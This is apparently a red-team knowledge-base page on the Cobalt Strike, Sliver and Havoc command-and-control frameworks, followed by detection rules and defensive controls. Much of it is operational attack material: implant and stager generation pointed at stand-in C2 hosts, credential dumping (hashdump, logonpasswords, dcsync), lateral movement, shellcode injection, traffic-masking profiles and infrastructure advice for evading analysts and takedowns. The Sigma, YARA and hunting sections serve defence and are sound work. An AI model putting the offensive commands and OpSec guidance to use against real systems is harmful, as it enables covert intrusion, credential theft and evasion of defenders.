# C2 Frameworks - Deep Dive

> **Scope:** Cobalt Strike, Sliver, and Havoc - architecture, deployment, OpSec considerations, detection signatures, and defensive countermeasures.

✅ **Quick-reference checklist:** [Command and Control](../Checklists/Command%26Control.md)

---

## Table of Contents

1. [C2 Architecture Fundamentals](#c2-architecture-fundamentals)
2. [Cobalt Strike](#cobalt-strike)
3. [Sliver](#sliver)
4. [Havoc](#havoc)
5. [Malleable C2 & Traffic Shaping](#malleable-c2--traffic-shaping)
6. [Infrastructure OpSec](#infrastructure-opsec)
7. [Detection & Hunting](#detection--hunting)
8. [Defensive Countermeasures](#defensive-countermeasures)

---

## C2 Architecture Fundamentals

A Command and Control (C2) framework provides operators with a persistent channel to interact with compromised hosts. Core components:

```
[Operator] ──► [Team Server / Listener] ◄──► [Redirectors] ◄──► [Implant on Target]
```

**Key concepts:**

| Term | Description |
|---|---|
| Listener | Server-side component that receives beacon callbacks |
| Implant/Agent | Malicious payload running on the target |
| Redirector | Intermediate hop to obscure true C2 infrastructure |
| Profile | Configuration controlling beacon behavior and traffic appearance |
| Sleep/Jitter | Beacon callback interval ± random variance to evade timing-based detection |
| Stager | Small loader that fetches and executes the full payload |

**Protocol options across frameworks:**

- HTTP/HTTPS (most common, blends with web traffic)
- DNS (low-and-slow, bypasses many egress filters)
- SMB (lateral movement within network, named pipes)
- TCP (raw, fast, noisier)
- WebSockets / gRPC (emerging, harder to inspect)

---

## Cobalt Strike

### Overview

Cobalt Strike (CS) is a commercial adversary simulation platform. Its Beacon payload is one of the most widely analyzed implants in existence - OpSec requires heavy customization.

### Team Server Setup

```bash
# Start team server (Linux)
./teamserver <external_IP> <password> [malleable_profile.c2]

# Recommended: run behind a redirector, never expose team server directly
# Use a systemd service for persistence
sudo nano /etc/systemd/system/cobaltstrike.service
```

```ini
[Unit]
Description=Cobalt Strike Team Server
After=network.target

[Service]
Type=simple
ExecStart=/opt/cobaltstrike/teamserver 0.0.0.0 SuperSecretPass /opt/profiles/custom.c2
WorkingDirectory=/opt/cobaltstrike
Restart=always

[Install]
WantedBy=multi-user.target
```

### Beacon Types

| Beacon | Protocol | Use Case |
|---|---|---|
| HTTP/HTTPS Beacon | HTTP/S | General purpose |
| DNS Beacon | DNS A/TXT/MX | Egress-restricted networks |
| SMB Beacon | Named pipes | Lateral movement (no internet required) |
| TCP Beacon | Raw TCP | Internal pivoting |
| External C2 | Custom channel | Slack, Twitter, OneDrive exfil channels |

### Key Beacon Commands

```bash
# Execution
shell <cmd>               # Spawn cmd.exe, execute command
run <cmd>                 # Execute without shell
execute-assembly <asm>    # Run .NET assembly in memory
powershell <cmd>          # Run PowerShell
powerpick <cmd>           # Unmanaged PowerShell (no powershell.exe)

# Lateral Movement
jump psexec <target> <share> <listener>
jump winrm <target> <listener>
jump psexec_psh <target> <listener>

# Credential Harvesting
hashdump                  # Dump SAM hashes (requires SYSTEM)
logonpasswords            # Mimikatz sekurlsa::logonpasswords
dcsync <domain> <user>    # DCSync attack via drsuapi

# Post-Exploitation
getsystem                 # Attempt privilege escalation
steal_token <PID>         # Impersonate process token
make_token <user> <pass>  # Create token from credentials
rev2self                  # Revert to original token

# Pivoting
socks 1080                # Start SOCKS4a proxy
rportfwd <lport> <rhost> <rport>  # Reverse port forward
```

### Artifact Kit & Payload Customization

Default CS artifacts are heavily signatured. Use Artifact Kit to customize:

- Replace default loader stubs with custom shellcode runners
- Modify PE headers, section names, import tables
- Change default sleep mask to obfuscate heap memory
- Use BOFs (Beacon Object Files) for in-process execution without fork-and-run

### OPSEC Considerations

```
❌ Avoid:
  - Default 60s sleep with 0% jitter
  - Default HTTP headers in Beacon traffic
  - Spawning cmd.exe / powershell.exe for every command
  - Using default artifacts (will be flagged by any AV)
  - Exposing team server port (50050) to internet

✅ Do:
  - Use malleable C2 profiles mimicking legitimate services
  - Set sleep 300 60 (5 min sleep, 60% jitter minimum)
  - Enable spawnto customization (avoid WerFault.exe, etc.)
  - Use SMB beacons for post-exploitation lateral movement
  - Rotate infrastructure regularly
```

---

## Sliver

### Overview

Sliver is an open-source C2 framework from BishopFox. Written in Go - implants compile to native binaries with no external dependencies. Actively developed and increasingly used in real-world operations.

### Installation

```bash
# Server install (Linux)
curl https://sliver.sh/install | sudo bash

# Start Sliver server
sliver-server

# Connect client
sliver-client
```

### Implant Generation

```bash
# HTTPS implant
generate --http https://your.redirector.com --os windows --arch amd64 --save /tmp/implant.exe

# mTLS implant (more secure, harder to detect)
generate --mtls your.c2server.com:8888 --os windows --arch amd64

# DNS implant
generate --dns c2.yourdomain.com --os linux --arch amd64

# Shellcode output (for injection)
generate --http https://c2.example.com --format shellcode --save /tmp/payload.bin

# Stager (small loader, fetches full implant)
generate stager --lhost 192.168.1.100 --lport 443 --protocol https
```

### Listeners

```bash
# Start HTTPS listener
https --lhost 0.0.0.0 --lport 443

# Start mTLS listener
mtls --lhost 0.0.0.0 --lport 8888

# DNS listener
dns --domains c2.yourdomain.com

# WireGuard tunnel listener
wg --lhost 0.0.0.0 --lport 51820
```

### Session Interaction

```bash
# List active sessions
sessions

# Interact with session
use <session_id>

# Core commands
execute -o whoami
shell                        # Interactive shell
upload /local/file /remote/path
download /remote/file /local/path
ps                           # Process list
getpid
getuid
getsystem                    # Attempt privilege escalation
impersonate <username>       # Token impersonation
make-token -u <user> -p <pass> -d <domain>

# Lateral movement
psexec --hostname <target> --service <name> --exe <implant>

# Post-exploitation
hashdump
dcsync --domain corp.local --user Administrator
execute-assembly <dotnet.exe> [args]
sideload <shared_lib.dll> <entrypoint>   # Reflective DLL injection
```

### Armory (Extension Packages)

```bash
# Install community extensions
armory install all

# Notable extensions
armory install rubeus        # Kerberos attacks
armory install seatbelt      # Host enumeration
armory install sharpup       # Privilege escalation checks
armory install bofnet        # BOF support
```

### OPSEC Features

- **Traffic profiles:** Sliver supports custom HTTP C2 profiles (similar to CS malleable)
- **mTLS:** Mutual TLS provides strong authentication; certificate pinning prevents MITM inspection
- **Canary domains:** Built-in canary detection to alert if implant is being analyzed
- **Evasion:** Supports LLVM obfuscation via garble, custom compile flags

---

## Havoc

### Overview

Havoc is an open-source, modern C2 framework with a Qt-based GUI. Written in C/C++ and Go. Demon implant supports indirect syscalls, sleep obfuscation, and token manipulation natively.

### Installation

```bash
# Install dependencies
sudo apt install -y git build-essential cmake libssl-dev pkg-config \
  libboost-all-dev mingw-w64 nasm python3-dev qt5-default

# Clone and build
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc
make ts-build    # Build team server
make client-build  # Build client GUI
```

### Teamserver Configuration

```yaml
# profiles/havoc.yaotl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator1" {
        Password = "S3cur3P@ss"
    }
}

Listeners {
    Http {
        Name         = "https-listener"
        Hosts        = ["your.redirector.com"]
        Port         = 443
        Secure       = true
        Cert         = "/path/to/cert.pem"
        Key          = "/path/to/key.pem"
        Response {
            Headers = [
                "Content-type: text/html",
                "Server: Apache"
            ]
        }
    }
}
```

### Demon Implant Features

The Demon agent has several built-in evasion capabilities:

| Feature | Description |
|---|---|
| Indirect Syscalls | Avoids hooked `ntdll.dll` functions via custom syscall stubs |
| Sleep Obfuscation | Encrypts implant in memory during sleep (Ekko/Foliage technique) |
| Stack Duplication | Spoofs call stack during sleep to evade memory scanning |
| Token Vault | Stores and manages impersonation tokens |
| PE Stomping | Overwrites implant PE headers to defeat signature scans |

### Key Commands

```bash
# Process injection
inject <PID> <arch> <shellcode_file>
shinject <PID> <arch> <shellcode_file>   # Shellcode injection

# Token operations
token steal <PID>
token make <domain\user> <password>
token list
token revert

# Kerberos
kerberos ticket import <ticket.kirbi>
kerberos ticket list

# Pivoting
socks5 add --port 1080
portfwd add --fport 8080 --thost 192.168.1.10 --tport 80

# .NET execution
dotnet inline-execute <assembly.exe> [args]
dotnet list-assemblies
```

---

## Malleable C2 & Traffic Shaping

Malleable C2 (Cobalt Strike) and equivalent profile systems allow operators to mimic legitimate application traffic.

### Profile Structure (CS)

```c
# Example: Mimic Microsoft Update traffic
set sleeptime "45000";
set jitter    "30";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/updates/download/windowsupdate";
    
    client {
        header "Accept" "application/octet-stream";
        header "Accept-Encoding" "identity";
        header "Connection" "close";
        metadata {
            base64url;
            prepend "sessionToken=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/octet-stream";
        header "Cache-Control" "no-cache";
        output {
            base64url;
            prepend "MZ";
            print;
        }
    }
}
```

### Profile Verification

```bash
# Validate CS profile before use
./c2lint custom_profile.c2
```

### Sliver HTTP C2 Profiles

```yaml
# .sliver/configs/http-c2.yaml
implant_config:
  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  chrome_extensions: []
  
server_headers:
  - "Server: Apache/2.4.51"
  - "X-Powered-By: PHP/7.4.3"

paths:
  - /assets/bootstrap.min.js
  - /cdn-cgi/challenge-platform/h/b/orchestrate/managed_widgets
  - /wp-includes/js/jquery/jquery.min.js
```

---

## Infrastructure OpSec

### Redirector Setup

Redirectors hide your team server from direct exposure. Never point beacons directly at the team server.

```
Internet ──► [CDN/Domain Fronting] ──► [Redirector VPS] ──► [Team Server]
```

**Nginx redirector config:**

```nginx
server {
    listen 443 ssl;
    server_name your.redirector.com;

    ssl_certificate /etc/letsencrypt/live/your.redirector.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your.redirector.com/privkey.pem;

    # Only forward known beacon URIs, block everything else
    location /updates/download/ {
        proxy_pass https://TEAM_SERVER_IP:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    # Block everything else (analyst crawlers, scanners)
    location / {
        return 302 https://microsoft.com$request_uri;
    }
}
```

### Domain Selection

- **Categorized domains:** Purchase aged domains already categorized as Finance, IT, News
- **Certificate:** Always use a valid TLS cert (Let's Encrypt) - avoid self-signed
- **Domain fronting:** Route traffic through CDNs (Cloudflare, AWS CloudFront) when possible
- **TTL:** Set short DNS TTL early, then lengthen - allows fast pivoting if burned

### Infrastructure Separation

```
Campaign A infrastructure ──► different VPS provider, different domain registrar
Campaign B infrastructure ──► different VPS provider, different domain registrar

Never reuse:
  - IP addresses across campaigns
  - SSL certificates
  - Domain registrar accounts
  - Payment methods
```

---

## Detection & Hunting

### Network-Based Detections

```yaml
# Sigma rule: Suspicious beacon jitter pattern
title: C2 Beacon Regular Interval Callback
logsource:
    category: network
detection:
    selection:
        dst_port:
            - 80
            - 443
    condition: selection
    timeframe: 1h
    aggregate: count() > 10 AND stddev(interval) < 5  # Low jitter = beacon
```

**Key network IOCs:**

- Regular callback intervals (low standard deviation in connection timing)
- Small consistent POST sizes (beacon check-in)
- HTTP responses with high entropy content
- Connections to newly registered domains (< 30 days old)
- Beacons to IP addresses (no domain) over 443
- DNS beacons: high volume TXT/NULL queries to single domain

### Host-Based Detections

```powershell
# Hunt for common CS injection patterns
Get-Process | Where-Object {
    $_.MainWindowTitle -eq "" -and
    $_.Modules.Count -lt 5 -and
    $_.WorkingSet -gt 10MB
}

# Detect fork-and-run (CS default behavior)
# Look for short-lived child processes spawned by beacon's spawnto
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" |
    Where-Object { $_.Properties[5].Value -match "WerFault|rundll32|gpupdate" }
```

**YARA rule for Cobalt Strike Beacon:**

```yara
rule CobaltStrike_Beacon_Generic {
    meta:
        description = "Detects common CS Beacon artifacts"
    strings:
        $s1 = "%s (admin)" ascii
        $s2 = "beacon.dll" ascii nocase
        $s3 = { 68 65 61 70 61 70 69 }  // "heapapi"
        $mz = { 4D 5A }
    condition:
        $mz at 0 and 2 of ($s*)
}
```

### Sliver-Specific Detections

- mTLS sessions: Look for certificate pinning failures in proxy logs
- Implant binary: Go binaries have identifiable section layouts (`.gopclntab`)
- Default canary domain callbacks during sandbox analysis

### Havoc-Specific Detections

- Demon implant default user-agent strings
- Indirect syscall patterns in memory (gadget chains in non-standard modules)
- Sleep obfuscation: encrypted RX memory regions that flip permissions

---

## Defensive Countermeasures

### Network Controls

```bash
# Block known C2 IOC feeds
# Integrate with: Emerging Threats, Abuse.ch, MISP, OpenCTI

# DNS RPZ (Response Policy Zone) to block C2 domains
# In BIND/Unbound, load RPZ feed from threat intel provider

# Egress filtering - whitelist approach
iptables -P OUTPUT DROP
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -d <approved_proxy_IP> -p tcp --dport 3128 -j ACCEPT
```

### Endpoint Controls

- **EDR tuning:** Alert on `CreateRemoteThread`, `VirtualAllocEx`, `WriteProcessMemory` API calls from non-standard processes
- **AMSI/ETW:** Ensure AMSI and ETW providers are not disabled (common evasion step)
- **LOLBin monitoring:** Alert on unusual parent-child process relationships (e.g., Word spawning PowerShell)
- **Memory scanning:** Use tools like PE-sieve, Moneta, or Volatility to detect injected implants

### Detection Engineering Priorities

| Priority | Detection | Coverage |
|---|---|---|
| High | Fork-and-run process spawning | CS default behavior |
| High | In-memory .NET assembly execution | execute-assembly |
| High | LSASS access from non-standard processes | Credential dumping |
| Medium | Regular interval outbound connections | Beacon heartbeat |
| Medium | DNS TXT record volume spikes | DNS C2 |
| Low | Go binary section signatures | Sliver implants |

---

## References

- [Cobalt Strike Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/)
- [Sliver Wiki](https://github.com/BishopFox/sliver/wiki)
- [Havoc Framework](https://github.com/HavocFramework/Havoc)
- [Malleable C2 Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
- [MITRE ATT&CK: C2](https://attack.mitre.org/tactics/TA0011/)
- [C2 Matrix](https://www.thec2matrix.com/)
